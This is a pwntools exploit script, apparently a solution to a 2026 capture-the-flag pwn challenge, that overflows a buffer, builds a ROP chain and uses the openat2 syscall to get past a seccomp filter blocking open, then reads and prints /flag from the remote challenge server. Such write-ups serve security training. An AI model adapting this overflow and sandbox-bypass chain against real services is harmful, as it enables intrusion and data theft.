# dibantu eiai :', jujur gk paham about seccomp but here
from pwn import *

elf = context.binary = ELF('./no-open-door')
# p = process()
p = remote('no-open-door.wolvctf-2026.kctf.cloud', 1337)
rop = ROP(elf)

POP_RDI   = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI   = rop.find_gadget(['pop rsi', 'ret'])[0]
POP_RDX   = rop.find_gadget(['pop rdx', 'ret'])[0]
POP_R10   = rop.find_gadget(['pop r10', 'ret'])[0]
POP_RAX   = rop.find_gadget(['pop rax', 'ret'])[0]
SYSCALL_R = rop.find_gadget(['syscall', 'ret'])[0]

bss = 0x4c9000
other_addr = bss + 0x100
buf_addr = other_addr + 0x100

def syscall(rax, rdi=None, rsi=None, rdx=None, r10=None):
    chain = b''
    if rdi is not None: chain += flat(POP_RDI, rdi)
    if rsi is not None: chain += flat(POP_RSI, rsi)
    if rdx is not None: chain += flat(POP_RDX, rdx)
    if r10 is not None: chain += flat(POP_R10, r10)
    chain += flat(POP_RAX, rax)
    chain += flat(SYSCALL_R)
    return chain

rop_chain  = syscall(0,   rdi=0, rsi=bss, rdx=0x118)
rop_chain += syscall(437, rdi=-100, rsi=bss, rdx=other_addr, r10=24)
rop_chain += syscall(0,   rdi=3, rsi=buf_addr, rdx=0x100)
rop_chain += syscall(1,   rdi=1, rsi=buf_addr, rdx=0x100)
rop_chain += syscall(231, rdi=0)

payload = flat('A'*0x48, rop_chain).ljust(0x200, b'\x00')

for_flek = b"/flag\x00".ljust(0x100, b'\x00') + flat(0, 0, 0)

p.sendafter('sandbox rental unit. no exec, no open.\n', payload)
p.send(for_flek)
p.interactive()